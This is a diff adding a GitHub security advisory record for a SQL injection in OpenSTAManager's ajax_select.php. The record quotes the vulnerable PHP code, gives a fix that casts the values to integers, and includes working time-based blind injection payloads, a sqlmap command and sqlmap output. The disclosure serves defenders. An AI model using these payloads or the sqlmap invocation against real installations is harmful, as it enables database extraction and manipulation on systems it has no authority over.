@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-qjv8-63xq-gq8m",
+  "modified": "2026-02-10T01:16:41Z",
+  "published": "2026-02-06T18:04:32Z",
+  "aliases": [
+    "CVE-2025-69214"
+  ],
+  "summary": "OpenSTAManager has a SQL Injection in ajax_select.php (componenti endpoint)",
+  "details": "## Summary\nA SQL Injection vulnerability exists in the `ajax_select.php` endpoint when handling the `componenti` operation. An authenticated attacker can inject malicious SQL code through the `options[matricola]` parameter.\n\n## Proof of Concept\n\n### Vulnerable Code\n**File:** `modules/impianti/ajax/select.php:122-124`\n\n```php\ncase 'componenti':\n    $impianti = $superselect['matricola'];\n    if (!empty($impianti)) {\n        $where[] = '`my_componenti`.`id_impianto` IN ('.$impianti.')';\n    }\n```\n\n### Data Flow\n1. **Source:** `$_GET['options']['matricola']` → `$superselect['matricola']`\n2. **Vulnerable:** User input concatenated directly into `IN()` clause without sanitization\n3. **Sink:** Query executed via AJAX framework\n\n### Exploit\n\n**Manual PoC (Time-based Blind SQLi):**\n```http\nGET /ajax_select.php?op=componenti&options[matricola]=1) AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND (1 HTTP/1.1\nHost: localhost:8081\nCookie: PHPSESSID=<valid-session>\n```\n<img width=\"1306\" height=\"581\" alt=\"image\" src=\"https://github.com/user-attachments/assets/238015dd-5644-4eed-ae8f-864dc0073011\" />\n\n**SQLMap Exploitation:**\n```bash\nsqlmap -u 'http://localhost:8081/ajax_select.php?op=componenti&options[matricola]=1*' \\\n  --cookie=\"PHPSESSID=<session>\" \\\n  --dbms=MySQL \\\n  --technique=T \\\n  --level=3 \\\n  --risk=3\n```\n\n**SQLMap Output:**\n```\n[INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable\nParameter: #1* (URI)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: options[matricola]=1) AND (SELECT 7438 FROM (SELECT(SLEEP(5)))grko)-- SvRI\nback-end DBMS: MySQL >= 5.0.12\n```\n<img width=\"1228\" height=\"801\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b0b7078b-09a7-4e53-956c-baf1d09ed59b\" />\n\n## Impact\n- **Data Exfiltration:** Time-based blind SQL Injection allows complete database extraction\n- **Authentication Bypass:** Access to sensitive component and equipment data\n- **Data Manipulation:** Potential unauthorized modification of records\n\n## Remediation\n\nCast values to integers before using in SQL:\n\n**Before:**\n```php\n$impianti = $superselect['matricola'];\nif (!empty($impianti)) {\n    $where[] = '`my_componenti`.`id_impianto` IN ('.$impianti.')';\n}\n```\n\n**After:**\n```php\n$impianti = $superselect['matricola'];\nif (!empty($impianti)) {\n    $ids = array_map('intval', explode(',', $impianti));\n    $where[] = '`my_componenti`.`id_impianto` IN ('.implode(',', $ids).')';\n}\n```\n\n## Credit\nDiscovered by: Łukasz Rybak",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "devcode-it/openstamanager"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.9.8"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/devcode-it/openstamanager/security/advisories/GHSA-qjv8-63xq-gq8m"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-69214"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/devcode-it/openstamanager"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-89"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-02-06T18:04:32Z",
+    "nvd_published_at": "2026-02-06T19:16:07Z"
+  }
+}
